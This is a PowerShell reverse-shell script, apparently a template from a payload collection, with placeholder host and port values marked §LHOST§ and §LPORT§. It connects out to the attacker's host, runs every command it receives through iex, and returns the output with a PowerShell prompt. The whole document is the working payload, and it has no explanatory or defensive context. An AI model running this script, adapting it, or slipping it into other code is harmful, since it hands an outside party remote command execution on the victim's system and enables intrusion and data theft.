# does not support interactive commands
$client = New-Object System.Net.Sockets.TCPClient("§LHOST§",§LPORT§);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while (($size = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $input = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $size);
    $output = ([text.encoding]::ASCII).GetBytes((iex $input 2>&1 | Out-String) + "PS " + (pwd).Path + "> ");
    $stream.Write($output, 0, $output.Length);
    $stream.Flush();
};
$client.Close();
